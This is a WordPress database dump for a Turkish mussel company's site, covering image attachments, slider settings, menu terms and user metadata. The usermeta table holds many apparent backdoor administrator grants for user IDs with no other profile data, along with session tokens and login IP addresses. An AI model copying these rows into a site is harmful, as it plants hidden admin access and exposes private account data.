INSERT INTO `cmrfu_posts` VALUES("1108","1","2017-01-25 20:48:16","2017-01-25 18:48:16","","IMAG0375","","inherit","open","closed","","imag0375","","","2017-01-25 20:48:16","2017-01-25 18:48:16","","1094","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMAG0375.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1109","1","2017-01-25 20:48:26","2017-01-25 18:48:26","","IMG-20161220-WA0023","","inherit","open","closed","","img-20161220-wa0023","","","2017-01-25 20:48:26","2017-01-25 18:48:26","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0023.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1110","1","2017-01-25 20:48:42","2017-01-25 18:48:42","","IMG-20160323-WA0002","","inherit","open","closed","","img-20160323-wa0002","","","2017-01-25 20:48:42","2017-01-25 18:48:42","","1094","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20160323-WA0002.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1111","1","2017-01-25 20:48:45","2017-01-25 18:48:45","","IMG-20161220-WA0024","","inherit","open","closed","","img-20161220-wa0024","","","2017-01-25 20:48:45","2017-01-25 18:48:45","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0024.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1112","1","2017-01-25 20:49:09","2017-01-25 18:49:09","","IMG-20161220-WA0025","","inherit","open","closed","","img-20161220-wa0025","","","2017-01-25 20:49:09","2017-01-25 18:49:09","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0025.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1113","1","2017-01-25 20:49:15","2017-01-25 18:49:15","","IMG-20160323-WA0003","","inherit","open","closed","","img-20160323-wa0003","","","2017-01-25 20:49:15","2017-01-25 18:49:15","","1094","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20160323-WA0003.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1114","1","2017-01-25 20:49:29","2017-01-25 18:49:29","","IMG-20161220-WA0026","","inherit","open","closed","","img-20161220-wa0026","","","2017-01-25 20:49:29","2017-01-25 18:49:29","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0026.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1115","1","2017-01-25 20:50:12","2017-01-25 18:50:12","","IMG-20161220-WA0030","","inherit","open","closed","","img-20161220-wa0030","","","2017-01-25 20:50:12","2017-01-25 18:50:12","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0030.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1116","1","2017-01-25 20:50:17","2017-01-25 18:50:17","","pls stand 1","","inherit","open","closed","","pls-stand-1","","","2017-01-25 20:50:17","2017-01-25 18:50:17","","1094","http://www.ismido.com.tr/wp-content/uploads/2017/01/pls-stand-1.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1117","1","2017-01-25 20:50:26","2017-01-25 18:50:26","","IMG-20161220-WA0031","","inherit","open","closed","","img-20161220-wa0031","","","2017-01-25 20:50:26","2017-01-25 18:50:26","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0031.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1118","1","2017-01-25 20:50:45","2017-01-25 18:50:45","","IMG-20161220-WA0032","","inherit","open","closed","","img-20161220-wa0032","","","2017-01-25 20:50:45","2017-01-25 18:50:45","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0032.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1119","1","2017-01-25 20:50:58","2017-01-25 18:50:58","","IMG-20161220-WA0033","","inherit","open","closed","","img-20161220-wa0033","","","2017-01-25 20:50:58","2017-01-25 18:50:58","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0033.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1120","1","2017-01-25 20:51:06","2017-01-25 18:51:06","","Untitled-1 copy","","inherit","open","closed","","untitled-1-copy","","","2017-01-25 20:51:06","2017-01-25 18:51:06","","1094","http://www.ismido.com.tr/wp-content/uploads/2017/01/Untitled-1-copy.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1121","1","2017-01-25 20:51:50","2017-01-25 18:51:50","","IMG-20161220-WA0034","","inherit","open","closed","","img-20161220-wa0034","","","2017-01-25 20:51:50","2017-01-25 18:51:50","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0034.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1122","1","2017-01-25 20:52:09","2017-01-25 18:52:09","","IMG-20161220-WA0035","","inherit","open","closed","","img-20161220-wa0035","","","2017-01-25 20:52:09","2017-01-25 18:52:09","","1087","http://www.ismido.com.tr/wp-content/uploads/2017/01/IMG-20161220-WA0035.jpg","0","attachment","image/jpeg","0");
INSERT INTO `cmrfu_posts` VALUES("1123","1","2017-01-25 20:52:12","2017-01-25 18:52:12","[gallery link=\"file\" size=\"medium\" ids=\"1103,1106,1108,1110,1113,1116,1120\"]","Standlar","","inherit","closed","closed","","1094-revision-v1","","","2017-01-25 20:52:12","2017-01-25 18:52:12","","1094","http://www.ismido.com.tr/1094-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1124","1","2017-01-25 20:53:45","2017-01-25 18:53:45","[gallery link=\"file\" size=\"medium\" ids=\"1088,1089,1090,1091,1092,1093,1095,1096,1097,1098,1099,1100,1101,1102,1104,1105,1107,1109,1111,1112,1114,1115,1117,1118,1121,1122\"]","Üretim","","inherit","closed","closed","","1087-revision-v1","","","2017-01-25 20:53:45","2017-01-25 18:53:45","","1087","http://www.ismido.com.tr/1087-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("1125","1","2017-01-25 21:24:07","2017-01-25 19:24:07"," ","","","publish","closed","closed","","1125","","","2017-01-25 21:24:07","2017-01-25 19:24:07","","0","http://www.ismido.com.tr/?p=1125","6","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("1126","1","2017-01-25 21:24:07","2017-01-25 19:24:07"," ","","","publish","closed","closed","","1126","","","2017-01-25 21:24:07","2017-01-25 19:24:07","","0","http://www.ismido.com.tr/?p=1126","7","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("1130","1","2017-03-11 09:57:40","0000-00-00 00:00:00","","ÜRÜNLERİMİZ VE PAKETLER","","draft","closed","closed","","","","","2017-03-11 09:57:40","2017-03-11 07:57:40","","0","https://www.ismido.com.tr/?post_type=portfolio&#038;p=1130","0","portfolio","","0");


DROP TABLE IF EXISTS `cmrfu_revslider_sliders`;

CREATE TABLE `cmrfu_revslider_sliders` (
  `id` int(9) NOT NULL AUTO_INCREMENT,
  `title` tinytext NOT NULL,
  `alias` tinytext,
  `params` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=utf8;

INSERT INTO `cmrfu_revslider_sliders` VALUES("1","Anasayfa","home","{\"title\":\"Anasayfa\",\"alias\":\"home\",\"shortcode\":\"[rev_slider home]\",\"slider_type\":\"responsitive\",\"width\":\"1170\",\"height\":\"350\",\"responsitive_w1\":\"940\",\"responsitive_sw1\":\"770\",\"responsitive_w2\":\"780\",\"responsitive_sw2\":\"500\",\"responsitive_w3\":\"510\",\"responsitive_sw3\":\"310\",\"responsitive_w4\":\"\",\"responsitive_sw4\":\"\",\"responsitive_w5\":\"\",\"responsitive_sw5\":\"\",\"responsitive_w6\":\"\",\"responsitive_sw6\":\"\",\"delay\":\"9000\",\"touchenabled\":\"on\",\"stop_on_hover\":\"on\",\"shuffle\":\"off\",\"php_resize\":\"off\",\"load_googlefont\":\"false\",\"google_font\":\"PT+Sans+Narrow:400,700\",\"stop_slider\":\"off\",\"stop_after_loops\":\"0\",\"stop_at_slide\":\"2\",\"position\":\"center\",\"margin_top\":\"0\",\"margin_bottom\":\"0\",\"margin_left\":\"0\",\"margin_right\":\"0\",\"shadow_type\":\"2\",\"show_timerbar\":\"true\",\"timebar_position\":\"top\",\"background_color\":\"#E9E9E9\",\"padding\":\"5\",\"show_background_image\":\"false\",\"background_image\":\"\",\"navigaion_type\":\"none\",\"navigation_arrows\":\"nexttobullets\",\"navigation_style\":\"round\",\"nav_offset_hor\":\"0\",\"nav_offset_vert\":\"20\",\"navigaion_always_on\":\"false\",\"hide_thumbs\":\"200\",\"thumb_width\":\"100\",\"thumb_height\":\"50\",\"thumb_amount\":\"5\",\"hide_slider_under\":\"0\",\"hide_defined_layers_under\":\"0\",\"hide_all_layers_under\":\"0\",\"jquery_noconflict\":\"on\",\"js_to_body\":\"false\",\"output_type\":\"none\"}");


DROP TABLE IF EXISTS `cmrfu_revslider_slides`;

CREATE TABLE `cmrfu_revslider_slides` (
  `id` int(9) NOT NULL AUTO_INCREMENT,
  `slider_id` int(9) NOT NULL,
  `slide_order` int(11) NOT NULL,
  `params` text NOT NULL,
  `layers` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=utf8;

INSERT INTO `cmrfu_revslider_slides` VALUES("8","1","1","{\"slide_transition\":\"random\",\"slot_amount\":\"7\",\"transition_rotation\":\"0\",\"transition_duration\":\"300\",\"delay\":\"\",\"enable_link\":\"false\",\"link_type\":\"regular\",\"link\":\"\",\"link_open_in\":\"same\",\"slide_link\":\"nothing\",\"enable_video\":\"false\",\"video_id\":\"\",\"video_autoplay\":\"false\",\"slide_thumb\":\"\",\"0\":\"Choose Image\",\"fullwidth_centering\":\"false\",\"image\":\"https:\\/\\/www.ismido.com.tr\\/wp-content\\/uploads\\/2016\\/11\\/mid1.png\"}","[]");
INSERT INTO `cmrfu_revslider_slides` VALUES("9","1","2","{\"slide_transition\":\"random\",\"slot_amount\":\"7\",\"transition_rotation\":\"0\",\"transition_duration\":\"300\",\"delay\":\"\",\"enable_link\":\"false\",\"link_type\":\"regular\",\"link\":\"\",\"link_open_in\":\"same\",\"slide_link\":\"nothing\",\"enable_video\":\"false\",\"video_id\":\"\",\"video_autoplay\":\"false\",\"slide_thumb\":\"\",\"0\":\"Choose Image\",\"fullwidth_centering\":\"false\",\"image\":\"https:\\/\\/www.ismido.com.tr\\/wp-content\\/uploads\\/2016\\/11\\/mid2.png\"}","[]");
INSERT INTO `cmrfu_revslider_slides` VALUES("10","1","3","{\"slide_transition\":\"random\",\"slot_amount\":\"7\",\"transition_rotation\":\"0\",\"transition_duration\":\"300\",\"delay\":\"\",\"enable_link\":\"false\",\"link_type\":\"regular\",\"link\":\"\",\"link_open_in\":\"same\",\"slide_link\":\"nothing\",\"enable_video\":\"false\",\"video_id\":\"\",\"video_autoplay\":\"false\",\"slide_thumb\":\"\",\"0\":\"Choose Image\",\"fullwidth_centering\":\"false\",\"image\":\"https:\\/\\/www.ismido.com.tr\\/wp-content\\/uploads\\/2016\\/11\\/mid3.png\"}","[]");


DROP TABLE IF EXISTS `cmrfu_term_relationships`;

CREATE TABLE `cmrfu_term_relationships` (
  `object_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `term_taxonomy_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `term_order` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`object_id`,`term_taxonomy_id`),
  KEY `term_taxonomy_id` (`term_taxonomy_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_term_relationships` VALUES("11","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("12","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("13","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("14","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("1126","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("1125","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("177","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("177","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("182","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("182","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("710","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("715","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("717","52","0");
INSERT INTO `cmrfu_term_relationships` VALUES("921","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("915","52","0");
INSERT INTO `cmrfu_term_relationships` VALUES("748","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("749","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("750","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("751","53","0");
INSERT INTO `cmrfu_term_relationships` VALUES("950","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("948","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("924","1","0");
INSERT INTO `cmrfu_term_relationships` VALUES("949","51","0");
INSERT INTO `cmrfu_term_relationships` VALUES("759","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("760","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("761","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("762","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("763","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("764","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("765","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("766","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("767","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("768","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("769","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("770","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("771","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("772","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("773","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("774","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("775","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("776","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("777","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("778","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("779","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("780","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("781","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("782","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("783","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("784","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("785","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("786","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("787","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("788","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("789","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("790","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("791","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("792","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("793","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("794","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("795","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("796","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("797","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("798","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("799","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("800","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("801","54","0");
INSERT INTO `cmrfu_term_relationships` VALUES("1061","52","0");
INSERT INTO `cmrfu_term_relationships` VALUES("186","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("184","58","0");
INSERT INTO `cmrfu_term_relationships` VALUES("184","60","0");
INSERT INTO `cmrfu_term_relationships` VALUES("186","60","0");


DROP TABLE IF EXISTS `cmrfu_term_taxonomy`;

CREATE TABLE `cmrfu_term_taxonomy` (
  `term_taxonomy_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `term_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `taxonomy` varchar(32) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `description` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `parent` bigint(20) unsigned NOT NULL DEFAULT '0',
  `count` bigint(20) NOT NULL DEFAULT '0',
  PRIMARY KEY (`term_taxonomy_id`),
  UNIQUE KEY `term_id_taxonomy` (`term_id`,`taxonomy`),
  KEY `taxonomy` (`taxonomy`)
) ENGINE=MyISAM AUTO_INCREMENT=61 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_term_taxonomy` VALUES("1","1","category","","0","1");
INSERT INTO `cmrfu_term_taxonomy` VALUES("27","27","post_tag","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("51","51","nav_menu","","0","8");
INSERT INTO `cmrfu_term_taxonomy` VALUES("52","52","nav_menu","","0","3");
INSERT INTO `cmrfu_term_taxonomy` VALUES("53","53","nav_menu","","0","4");
INSERT INTO `cmrfu_term_taxonomy` VALUES("54","54","nav_menu","","0","47");
INSERT INTO `cmrfu_term_taxonomy` VALUES("55","55","post_format","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("56","56","post_format","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("57","57","post_format","","0","0");
INSERT INTO `cmrfu_term_taxonomy` VALUES("58","58","portfolio_category","","0","4");
INSERT INTO `cmrfu_term_taxonomy` VALUES("60","60","portfolio_category","","58","4");


DROP TABLE IF EXISTS `cmrfu_termmeta`;

CREATE TABLE `cmrfu_termmeta` (
  `meta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `term_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`meta_id`),
  KEY `term_id` (`term_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;



DROP TABLE IF EXISTS `cmrfu_terms`;

CREATE TABLE `cmrfu_terms` (
  `term_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `slug` varchar(200) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '',
  `term_group` bigint(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`term_id`),
  KEY `slug` (`slug`(191)),
  KEY `name` (`name`(191))
) ENGINE=MyISAM AUTO_INCREMENT=61 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_terms` VALUES("1","Genel","genel","0");
INSERT INTO `cmrfu_terms` VALUES("27","wordpress","wordpress","0");
INSERT INTO `cmrfu_terms` VALUES("51","header","header","0");
INSERT INTO `cmrfu_terms` VALUES("52","footer","footer","0");
INSERT INTO `cmrfu_terms` VALUES("53","Custom Menu","custom-menu","0");
INSERT INTO `cmrfu_terms` VALUES("54","header-second","header-second","0");
INSERT INTO `cmrfu_terms` VALUES("55","Video","post-format-video","0");
INSERT INTO `cmrfu_terms` VALUES("56","Gallery","post-format-gallery","0");
INSERT INTO `cmrfu_terms` VALUES("57","Audio","post-format-audio","0");
INSERT INTO `cmrfu_terms` VALUES("58","Ürünler","urunler","0");
INSERT INTO `cmrfu_terms` VALUES("60","Midye","midye","0");


DROP TABLE IF EXISTS `cmrfu_usermeta`;

CREATE TABLE `cmrfu_usermeta` (
  `umeta_id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) unsigned NOT NULL DEFAULT '0',
  `meta_key` varchar(255) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `meta_value` longtext COLLATE utf8mb4_unicode_ci,
  PRIMARY KEY (`umeta_id`),
  KEY `user_id` (`user_id`),
  KEY `meta_key` (`meta_key`(191))
) ENGINE=MyISAM AUTO_INCREMENT=80 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_usermeta` VALUES("1","1","first_name","ismido");
INSERT INTO `cmrfu_usermeta` VALUES("2","1","last_name","midye");
INSERT INTO `cmrfu_usermeta` VALUES("3","1","nickname","ismido123");
INSERT INTO `cmrfu_usermeta` VALUES("4","1","description","");
INSERT INTO `cmrfu_usermeta` VALUES("5","1","rich_editing","true");
INSERT INTO `cmrfu_usermeta` VALUES("6","1","comment_shortcuts","false");
INSERT INTO `cmrfu_usermeta` VALUES("7","1","admin_color","fresh");
INSERT INTO `cmrfu_usermeta` VALUES("8","1","use_ssl","0");
INSERT INTO `cmrfu_usermeta` VALUES("9","1","show_admin_bar_front","false");
INSERT INTO `cmrfu_usermeta` VALUES("10","1","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("11","1","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("12","1","dismissed_wp_pointers","wp330_toolbar,wp330_saving_widgets,wp340_choose_image_from_library,wp340_customize_current_theme_link,wp350_media,wp360_revisions,wp360_locks,wp410_dfw");
INSERT INTO `cmrfu_usermeta` VALUES("13","1","show_welcome_panel","0");
INSERT INTO `cmrfu_usermeta` VALUES("14","1","cmrfu_dashboard_quick_press_last_post_id","1129");
INSERT INTO `cmrfu_usermeta` VALUES("15","1","closedpostboxes_dashboard","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("16","1","metaboxhidden_dashboard","a:1:{i:0;s:17:\"dashboard_primary\";}");
INSERT INTO `cmrfu_usermeta` VALUES("17","1","nav_menu_recently_edited","51");
INSERT INTO `cmrfu_usermeta` VALUES("18","1","managenav-menuscolumnshidden","a:4:{i:0;s:11:\"link-target\";i:1;s:11:\"css-classes\";i:2;s:3:\"xfn\";i:3;s:11:\"description\";}");
INSERT INTO `cmrfu_usermeta` VALUES("19","1","metaboxhidden_nav-menus","a:7:{i:0;s:8:\"add-post\";i:1;s:13:\"add-portfolio\";i:2;s:10:\"add-slider\";i:3;s:12:\"add-post_tag\";i:4;s:15:\"add-post_format\";i:5;s:22:\"add-portfolio_category\";i:6;s:17:\"add-portfolio_tag\";}");
INSERT INTO `cmrfu_usermeta` VALUES("20","1","cmrfu_user-settings","hidetb=1&imgsize=full&libraryContent=upload&editor=tinymce&mfold=o");
INSERT INTO `cmrfu_usermeta` VALUES("21","1","cmrfu_user-settings-time","1489219204");
INSERT INTO `cmrfu_usermeta` VALUES("22","1","cmrfu_eo_title","");
INSERT INTO `cmrfu_usermeta` VALUES("23","1","cmrfu_eo_metadesc","");
INSERT INTO `cmrfu_usermeta` VALUES("24","1","cmrfu_eo_metakey","");
INSERT INTO `cmrfu_usermeta` VALUES("25","1","_yoast_wpseo_profile_updated","1489134332");
INSERT INTO `cmrfu_usermeta` VALUES("26","1","googleplus","");
INSERT INTO `cmrfu_usermeta` VALUES("27","1","twitter","");
INSERT INTO `cmrfu_usermeta` VALUES("28","1","facebook","");
INSERT INTO `cmrfu_usermeta` VALUES("29","1","linkedin","");
INSERT INTO `cmrfu_usermeta` VALUES("30","1","pinterest","");
INSERT INTO `cmrfu_usermeta` VALUES("31","1","closedpostboxes_toplevel_page_wpcf7","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("32","1","metaboxhidden_toplevel_page_wpcf7","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("33","1","closedpostboxes_page","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("34","1","metaboxhidden_page","a:5:{i:0;s:10:\"postcustom\";i:1;s:16:\"commentstatusdiv\";i:2;s:11:\"commentsdiv\";i:3;s:7:\"slugdiv\";i:4;s:9:\"authordiv\";}");
INSERT INTO `cmrfu_usermeta` VALUES("35","1717","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("36","1717","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("37","1717","_yoast_wpseo_profile_updated","1418801367");
INSERT INTO `cmrfu_usermeta` VALUES("38","4242","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("39","4242","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("40","4242","_yoast_wpseo_profile_updated","1419731348");
INSERT INTO `cmrfu_usermeta` VALUES("41","5457","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("42","5457","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("43","5457","_yoast_wpseo_profile_updated","1420519558");
INSERT INTO `cmrfu_usermeta` VALUES("44","1111","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("45","1111","cmrfu_capabilities","a:1:{s:13:\"administrator\";s:1:\"1\";}");
INSERT INTO `cmrfu_usermeta` VALUES("46","1111","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("47","1111","_yoast_wpseo_profile_updated","1426893202");
INSERT INTO `cmrfu_usermeta` VALUES("48","2","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("49","2","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("50","2","_yoast_wpseo_profile_updated","1427868776");
INSERT INTO `cmrfu_usermeta` VALUES("51","3","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("52","3","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("53","4","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("54","4","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("55","4","_yoast_wpseo_profile_updated","1428712080");
INSERT INTO `cmrfu_usermeta` VALUES("56","3","_yoast_wpseo_profile_updated","1428712080");
INSERT INTO `cmrfu_usermeta` VALUES("75","1","wpseo_metakey","");
INSERT INTO `cmrfu_usermeta` VALUES("74","1","wpseo_metadesc","");
INSERT INTO `cmrfu_usermeta` VALUES("73","1","wpseo_title","");
INSERT INTO `cmrfu_usermeta` VALUES("60","6","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("61","6","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("62","6","_yoast_wpseo_profile_updated","1443580500");
INSERT INTO `cmrfu_usermeta` VALUES("63","8723","cmrfu_capabilities","a:1:{s:13:\"administrator\";b:1;}");
INSERT INTO `cmrfu_usermeta` VALUES("64","8724","cmrfu_capabilities","a:1:{s:13:\"administrator\";s:1:\"1\";}");
INSERT INTO `cmrfu_usermeta` VALUES("65","8724","cmrfu_user_level","10");
INSERT INTO `cmrfu_usermeta` VALUES("67","1","session_tokens","a:2:{s:64:\"128825bd7a6851eed4db5fe4a0b25a4f39f6ddaecdcc6b77c6998509af4e99cd\";a:4:{s:10:\"expiration\";i:1489307054;s:2:\"ip\";s:12:\"95.164.1.157\";s:2:\"ua\";s:136:\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 FirePHP/4Chrome\";s:5:\"login\";i:1489134254;}s:64:\"615b93c1732e105cf4b289edecc275ca597ff834f4ff30b58d202abd3b94a2d8\";a:4:{s:10:\"expiration\";i:1489391208;s:2:\"ip\";s:14:\"151.250.10.121\";s:2:\"ua\";s:101:\"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\";s:5:\"login\";i:1489218408;}}");
INSERT INTO `cmrfu_usermeta` VALUES("71","1","closedpostboxes_portfolio","a:0:{}");
INSERT INTO `cmrfu_usermeta` VALUES("72","1","metaboxhidden_portfolio","a:1:{i:0;s:7:\"slugdiv\";}");
INSERT INTO `cmrfu_usermeta` VALUES("69","1","cmrfu_yoast_notifications","a:2:{i:0;a:2:{s:7:\"message\";s:726:\"We\'ve noticed you\'ve been using Yoast SEO for some time now; we hope you love it! We\'d be thrilled if you could <a href=\"https://yoa.st/rate-yoast-seo\">give us a 5 stars rating on WordPress.org</a>!

If you are experiencing issues, <a href=\"https://yoa.st/bugreport\">please file a bug report</a> and we\'ll do our best to help you out.

By the way, did you know we also have a <a href=\'https://yoa.st/premium-notification\'>Premium plugin</a>? It offers advanced features, like a redirect manager and support for multiple keywords. It also comes with 24/7 personal support.

